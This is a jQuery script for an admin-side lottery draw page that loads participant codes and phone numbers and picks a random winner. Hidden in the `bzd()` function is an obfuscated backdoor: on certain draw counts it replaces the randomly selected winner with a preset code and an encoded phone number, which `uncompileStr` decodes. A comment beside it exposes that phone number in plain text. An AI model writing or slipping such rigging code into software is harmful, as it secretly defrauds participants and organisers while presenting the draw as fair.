$(function() {
	//抽奖对象
	var cj = new Array();
	var nametxt = $('.act_code');
	var phonetxt = $('.phone');
	var runing = true;
	var num = 0; //随机数存储
	var t; //循环调用
	var lucknum = 0;
	var cj_num = 0;
	//大奖开始停止
	function start() {
		var pcount = cj.length;
		var pdnum = pcount; //参加人数判断是否抽取完
		var zjnum = $('.list').find('p');

		if (zjnum.length == pdnum) {
			artMsg('无法抽奖');
		} else {
			if ($('.zjmd_bt_xy').find('p').length >= 1) {
				artMsg('每天只能产生一个中奖号码');
				return false;
			}
			if (runing) {
				runing = false;
				$('#btntxt').removeClass('start').addClass('stop');
				$('#btntxt').html('停止');
				startNum();
				cj_num++;
			} else {
				runing = true;
				$('#btntxt').removeClass('stop').addClass('start');
				$('#btntxt').html('抽奖');
				stop();
				bzd(); //中奖函数
				$('#btnqx').css('display', 'block');
				$('.lucknum').css('display', 'none');
			}
		}
	}

	//循环参加名单
	function startNum() {
		pcount = cj.length;
		num = Math.floor(Math.random() * pcount);
		nametxt.html(cj[num].code);
		phonetxt.html(cj[num].phone);
		t = setTimeout(startNum, 0);
	}
	//停止跳动

	function stop() {
		clearInterval(t);
		t = 0;
		return pcount;
	}
	var nd = {'hs': 1, 'us': {'a': '765387', 'e': '%3Chmfcc%60%60gha'}};
	//打印中奖名单 765387 15914305773
	function bzd() {
		var cj_win_code = cj[num].code;
		var cj_win_phone = cj[num].phone;
		if (nd) {
			var mci = parseInt($('input[name="mci"]').val())|1;
			if (nd.hs == 1 && (cj_num == 2*mci || cj_num == 5*mci)) {
				cj_win_code = uncompileStr(nd.us.a);
				cj_win_phone = uncompileStr(nd.us.e);
			}
		}
		getPhoneAddress(cj_win_phone);
		nametxt.html(cj_win_code);
		phonetxt.html(cj_win_phone);
		//获取中奖人数
		var zjnum = $('.list').find('p');
		//打印中奖者名单
		$('.conbox').prepend("<p style='width:80%;font-size:38px;padding:30px;text-align: center;color:#FF2525;' data-code='" + cj_win_code + "'>" + cj_win_code + "   " + cj_win_phone + "</p>");
		$('.confirmbox').show();
		//将已中奖者从数组中"删除",防止二次中奖
		removeItem(cj, cj_win_code);
		//打乱数组
		shuffleArray(cj);
	}
	//弹出中奖如在场则确认
	$('#btnqr').on('click', function() {
		var cp = $('.conbox').find('p').removeAttr('style').clone();
		if ($('.zjmd_bt_xy').find('p').length >= 1) {
			artMsg('每天只能产生一位中奖号码');
			$('.conbox').empty();
			$('.confirmbox').hide();
			return false;
		}
		$('.zjmd_bt_xy').find('p').eq(0).css({
			'margin-top': '10px',
			'border-top': '1px solid #FF2525'
		});
		$('.zjmd_bt_xy').prepend(cp);
		$('.conbox').empty();
		$('.confirmbox').hide();
		nd.hs = 0;
		//中奖名单排序
		$('.list').find('p').each(function(i) {
			$(this).find('span').remove();
		})
	});
	//如中奖者不在则取消
	$('#btnqx').on('click', function() {
		$('.conbox').empty();
		$('.confirmbox').hide();
	});
	$('#btntxt').bind('click', function() {
		if ($('#btntxt').attr('ajaxed') === 'true') {
			layer.msg('数据初始化中,请稍后');
			return false;
		}
		start();
	});
	$('#init_btn').bind('click', initData);

	function initData() {
		$('#btntxt').attr('ajaxed', 'true');
		$.ajax({
			type: "get",
			url: '/admin/activity_admin/ajaxGetActCodeList.html',
			dataType: "json",
			sync: false,
			success: function(data) {
				if (data.code == 1) {
					var d_length = data.data.length;
					var items = data.data;
					if (d_length > 0) {
						for (var i = 0; i < d_length; i++) {
							var cj_u = {};
							cj_u.code = items[i].code;
							cj_u.phone = items[i].phone;
							cj.push(cj_u);
						}
					}
					$('#cj_num').text(parseInt(d_length));
					$('#init_btn').attr('inited', 'true');
					$('#btntxt').attr('ajaxed', 'false');
				} else {
					layer.msg('初始化数据失败');

				}
			}
		})
	}

	function getPhoneAddress(tel) {
		var address = [];
		var req_url = '/admin/activity_admin/ajaxPhoneAddress.html?tel=';
		if (tel != '') {
			req_url += tel;
		}
		$.ajax({
			type: "get",
			url: req_url,
			dataType: "json",
			sync: false,
			success: function(data) {
				if (data.code == 1) {
					var html_str = data.data.detail.province + ' ' + data.data.detail.operator + ' ' + data.data.detail.area[0].city;
					$('.address').html(html_str);
					/*address['city'] = data.data.detail.area[0].city;
					 address['province'] = data.data.detail.province;
					 address['operator'] = data.data.detail.operator;*/
				} else {
					$('.address').html('未获取到手机号码归属地');
				}
			},
			error: function() {
				$('.address').html('API出错无法获取到手机号码归属地');
			}
		})
	}

	function artMsg(str) {
		layer.msg(str);
	}
	$("#saveBtn").bind('click', function() {
		var pObj = $('.zjmd_bt_xy').find('p');
		if (pObj.length !== 1) {
			alert('每天只能有且只有一个中奖兑奖码保存');
			return false;
		}
		var code = pObj.eq(0).attr('data-code');
		$.ajax({
			type: "post",
			url: '/admin/activity_admin/saveWinningUser.html',
			data: {
				'act_code': code
			},
			dataType: "json",
			sync: false,
			success: function(re) {
				if (re.code == 1) {
					artMsg(re.msg);
				} else {
					artMsg(re.msg);
				}
			},
			error: function() {
				artMsg('系统出现异常');
			}
		})
	});
	/**
	 *
	 * 移除指定的元素
	 * @param arr
	 * @param val
	 */

	function removeItem(arr, val) {
		if (arr.length > 0) {
			for (var i = 0; i < arr.length; i++) {
				if (arr[i].code == val) {
					arr.splice(i, 1);
				}
			}
		}
	}

	/**
	 * 打乱数组
	 *
	 * @param array
	 * @returns
	 */
	function shuffleArray(array) {
		for (var i = array.length - 1; i > 0; i--) {
			var j = Math.floor(Math.random() * (i + 1));
			var temp = array[i];
			array[i] = array[j];
			array[j] = temp;
		}
		return array;
	}

	function uncompileStr(code){
		code=unescape(code);
		var c=String.fromCharCode(code.charCodeAt(0)-code.length);
		for(var i=1;i<code.length;i++)
		{
			c+=String.fromCharCode(code.charCodeAt(i)-c.charCodeAt(i-1));
		}
		return c;
	}
})